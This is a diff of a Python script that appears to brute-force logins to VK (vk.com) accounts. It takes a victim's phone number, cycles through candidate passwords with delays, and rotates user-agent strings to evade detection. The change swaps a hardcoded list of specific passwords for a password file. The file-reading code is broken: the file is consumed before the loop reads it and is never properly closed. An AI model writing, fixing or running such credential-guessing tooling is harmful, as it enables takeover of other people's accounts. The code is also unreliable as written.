@@ -10,11 +10,17 @@ banner ="""
 """
 print(banner)
 
-password =['saharbelov','saharbelov1','saharbelow3','iunderstand','iunderstoond','Adgjlxvn1','ADhkxvnm','Adgjlxvn3','Adgjlxvn2']
+password =[]
 login = input(" Телефон :")
 
 url ="https://vk.com/"
+
 print("[ Номер телефона| Работает | Пароль ]")
+f=open("passwords","r")
+f.read()
+for passwor in f:
+   password.append(passwor)
+f.close
 for passw in password:
    time.sleep(10)
    user_agents=['AndroidDownloadManager/6.0 (Linux; U; Android 6.0; DIG-L21HN Build/HUAWEIDIG-L21HN)','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36']
